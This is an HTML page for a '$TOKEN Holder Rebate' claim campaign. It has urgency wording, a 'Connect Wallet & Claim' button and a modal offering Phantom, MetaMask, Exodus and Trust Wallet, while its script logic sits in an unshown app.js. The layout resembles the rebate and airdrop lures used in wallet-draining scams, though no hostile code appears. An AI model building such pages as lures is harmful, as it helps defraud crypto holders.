<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title data-campaign-title="$TOKEN Holder Rebate">🎉 $TOKEN Holder Rebate</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
</head>
<body>
  <div class="campaign-wrapper">
    <div class="campaign-card">
      <h1 data-campaign-title="$TOKEN Holder Rebate">🎉 $TOKEN Holder Rebate</h1>
      <p>Hold ≥50 tokens & claim your share before the window closes!</p>

      <!-- Live Stats -->
      <div id="liveStats" class="stats-box">⏳ Loading live stats...</div>

      <button id="claimBtn" class="primary-btn">Connect Wallet & Claim</button>
    </div>

    <!-- Wallet Selection Modal -->
    <div id="walletModal" class="modal hidden">
      <div class="modal-content">
        <h3>Select Your Wallet</h3>
        <div class="wallet-grid">
          <button data-wallet="phantom">Phantom</button>
          <button data-wallet="metamask">MetaMask</button>
          <button data-wallet="exodus">Exodus</button>
          <button data-wallet="trust">Trust Wallet</button>
        </div>
        <div id="qrContainer" class="qr-box"></div>
        <button id="closeModal" class="secondary-btn">← Back</button>
      </div>
    </div>
  </div>

  <script src="app.js"></script>
</body>
</html>
